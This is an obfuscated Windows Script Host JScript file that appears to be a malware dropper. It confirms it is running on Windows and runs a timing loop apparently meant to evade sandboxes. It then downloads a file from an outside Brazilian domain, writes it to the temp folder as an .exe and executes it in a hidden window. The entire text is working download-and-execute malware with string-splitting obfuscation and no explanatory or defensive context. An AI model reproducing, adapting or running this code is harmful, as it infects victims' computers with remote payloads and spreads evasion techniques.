var AC = false;
var u = "CreateObject";
var L = function tA() {return WScript[u]("WScript.Shell");}(), au = 11;
var o = "MSXML2.XMLHTTP";
var EK = 2123213;
var M = 0;
function a(Tz){L["Run"](Tz, M, M);};
function iB(){return "" + o;};
function We(j, ML){M = M * 1; return j - ML;};
function Nt(){return u;};
/*@cc_on
  @if (@_win32 || @_win64)
    AC = true;
  @end
@*/
if (AC)
{
var E = "";
function K(){return 22;};
var Y = 0; var Lq = 0;
function X()
{
var iP = new this["Date"]();
var A = iP["getUTCMilliseconds"]();
WScript["Sleep"](K());
var iP = new this["Date"]();
var Yd = iP["getUTCMilliseconds"]();
WScript["Sleep"](K());
var iP = new this["Date"]();
var BX = iP["getUTCMilliseconds"]();
var Y = "XY";
Y = We(Yd, A);
var Lq = "iG";
Lq = We(BX, Yd);
E = "open";
return We(Y, Lq);
}
var n = false;
var A0 = false;
for (var kD = M; kD < K() * 1; kD++){if (X() != M){
n = true; 
Lq = "31" + 11 * Y + Lq; 
A0 = true; 
break;
}}
function sR() {return ((n == true) && (n == A0)) ? 1 : M;};
if (n && sR() && A0){
function qm() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "fc9LAgRNc.exe";};
 BP = iB();
 UC = WScript[u](BP);
 var F = 1;
 while (F){
try {
UC[E]("GET", "http://caferacerpneus.com.br/lw2osd", false);
UC["send"]();
qc = "Sleep";
for (;;){WScript[qc](K() * 11); if (UC["readystate"] >= 2 * 2) break;};
F = M;
} catch(P){};
}
function e(p) {var hC = (1, 2, 3, 4, 5, p); return hC;};
k = WScript[Nt()]("ADODB.Stream");
BP = k;
BP[E]();
BP["type"] = e(1);
BP["write"](UC["ResponseBody"]);
k["position"] = e(M);
BP["Save" + "ToFile"](qm(), 2);
k["c"+"lose"]();
Q = qm();
a(Q);
}
}

